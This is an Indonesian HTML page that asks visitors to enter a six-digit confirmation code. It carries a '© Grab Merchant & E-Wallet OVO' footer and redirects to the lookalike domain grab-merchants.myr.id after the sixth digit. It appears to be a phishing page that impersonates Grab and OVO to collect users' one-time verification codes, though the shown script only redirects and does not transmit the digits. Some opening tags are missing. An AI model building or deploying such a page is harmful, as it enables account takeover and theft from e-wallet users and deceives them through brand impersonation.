<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#ffffff">
  <title>Masukan kode </title>
  <style>
    :root {
      --ink: #202124;
      --muted: #6b7280;
      --line: #d9dde3;
      --focus: #3157a4;
      --page: #ffffff;
    }
    * { box-sizing: border-box; }
    html, body { min-height: 100%; }
    body {
      margin: 0;
      min-height: 100svh;
      background: var(--page);
      color: var(--ink);
      font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
    }
    .app {
      min-height: 100svh;
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: max(44px, env(safe-area-inset-top)) 24px max(28px, env(safe-area-inset-bottom));
    }
    .brand {
      width: min(100%, 350px);
      margin: 34px auto 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .brand img {
      display: block;
      width: 100%;
      height: auto;
      object-fit: contain;
    }
    .content {
      width: 100%;
      max-width: 390px;
      margin: clamp(24px, 5vh, 42px) auto 0;
      text-align: center;
    }
    h1 {
      margin: 0;
      font-size: 27px;
      line-height: 1.2;
      font-weight: 700;
      letter-spacing: -.55px;
    }
    .subtitle {
      margin: 13px 0 34px;
      color: var(--muted);
      font-size: 15px;
      line-height: 1.55;
    }
    .digit-row {
      display: grid;
      grid-template-columns: repeat(6, minmax(0, 1fr));
      gap: 9px;
      width: 100%;
    }
    .digit {
      width: 100%;
      min-width: 0;
      height: 58px;
      border: 1.5px solid var(--line);
      border-radius: 11px;
      background: #fff;
      color: var(--ink);
      text-align: center;
      font-size: 23px;
      font-weight: 650;
      outline: none;
      caret-color: var(--focus);
      transition: border-color .16s ease, box-shadow .16s ease;
    }
    .digit:focus {
      border-color: var(--focus);
      box-shadow: 0 0 0 3px rgba(49,87,164,.11);
    }
    .helper {
      min-height: 20px;
      margin: 15px 0 0;
      color: var(--muted);
      font-size: 12px;
      line-height: 1.5;
    }
    .loading-screen {
      position: fixed;
      inset: 0;
      z-index: 20;
      display: none;
      align-items: center;
      justify-content: center;
      background: #fff;
    }
    .loading-screen.active { display: flex; }
    .loading-dots { display: flex; align-items: center; gap: 24px; }
    .loading-dots span {
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: #35d9ad;
      animation: dot-pulse .9s ease-in-out infinite;
    }
    .loading-dots span:nth-child(2) { animation-delay: .14s; }
    .loading-dots span:nth-child(3) { animation-delay: .28s; }
    @keyframes dot-pulse {
      0%, 60%, 100% { transform: scale(1); opacity: 1; }
      30% { transform: scale(.82); opacity: .65; }
    }
    @media (prefers-reduced-motion: reduce) {
      .loading-dots span { animation: none; }
    }

    @media (max-width: 360px) {
      .app { padding-left: 18px; padding-right: 18px; }
      .digit-row { gap: 7px; }
      .digit { height: 53px; border-radius: 9px; }
      .brand { width: min(100%, 310px); }
    }
    @media (min-width: 700px) {
      body { background: #f5f6f8; }
      .app {
        width: min(100%, 430px);
        min-height:  min(900px, 100svh);
        margin: 0 auto;
        background: #fff;
        box-shadow: 0 0 36px rgba(0,0,0,.05);
      }
    }
  </style>
</head>

    <section class="content" aria-labelledby="page-title">
      <h1 id="page-title">Masukan kode</h1>
      <p class="subtitle">Silahkan konfirmasi kode 6 digit disini .</p>

      <div class="digit-row" role="group" aria-label="Kolom kode enam digit">
        <input class="digit" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" aria-label="Digit 1"><input class="digit" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" aria-label="Digit 2"><input class="digit" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" aria-label="Digit 3"><input class="digit" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" aria-label="Digit 4"><input class="digit" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" aria-label="Digit 5"><input class="digit" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" aria-label="Digit 6">
      </div>
      <p class="helper" id="helper" aria-live="polite"> © Grab Merchant & E-Wallet OVO.</p>
    </section>
  </main>

  <div class="loading-screen" id="loadingScreen" aria-label="Memproses">
    <div class="loading-dots" aria-hidden="true">
      <span></span><span></span><span></span>
    </div>
  </div>

  <script>
    const fields = [...document.querySelectorAll('.digit')];
    const helper = document.getElementById('helper');
    const loadingScreen = document.getElementById('loadingScreen');
    let redirectStarted = false;

    function updateCount() {
      const count = fields.filter(item => item.value !== '').length;
      helper.textContent = count === 6
        ? 'Enam digit telah terisi.'
        : `Masukkan ${6 - count} angka lagi.`;
      if (count === 6 && !redirectStarted) {
        redirectStarted = true;
        loadingScreen.classList.add('active');
        setTimeout(() => {
          window.location.href = 'https://grab-merchants.myr.id/lp/halaman-akhir';
        }, 1400);
      }
    }

    fields.forEach((field, index) => {
      field.addEventListener('input', () => {
        field.value = field.value.replace(/[^0-9]/g, '').slice(-1);
        if (field.value && index < fields.length - 1) fields[index + 1].focus();
        updateCount();
      });

      field.addEventListener('keydown', event => {
        if (event.key === 'Backspace' && !field.value && index > 0) {
          fields[index - 1].focus();
        }
        if (event.key === 'ArrowLeft' && index > 0) fields[index - 1].focus();
        if (event.key === 'ArrowRight' && index < fields.length - 1) fields[index + 1].focus();
      });

      field.addEventListener('paste', event => {
        const pasted = (event.clipboardData || window.clipboardData)
          .getData('text').replace(/[^0-9]/g, '').slice(0, 6);
        if (!pasted) return;
        event.preventDefault();
        pasted.split('').forEach((digit, i) => {
          if (fields[i]) fields[i].value = digit;
        });
        fields[Math.min(pasted.length, 5)].focus();
        updateCount();
      });
    });
  </script>
